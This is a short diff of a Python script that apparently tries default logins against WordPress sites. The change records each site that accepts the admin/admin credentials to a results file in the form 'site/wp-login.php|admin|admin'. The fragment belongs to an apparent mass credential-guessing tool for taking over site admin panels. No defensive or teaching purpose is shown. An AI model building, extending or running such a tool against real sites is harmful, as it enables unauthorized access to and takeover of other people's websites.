@@ -15,7 +15,7 @@ def login(site):
 		result = response.status_code
 		if result == 302:
 			with open("result.txt", "a") as result_file:
-				result_file.write(site + "\n")
+				result_file.write(site+'/wp-login.php'+'|'+'admin'+'|'+'admin'+'\n')
 			print(Fore.GREEN+"{} [admin:pass]".format(site))
 		else:
 			print(Fore.RED+"{} [Failed]".format(site))
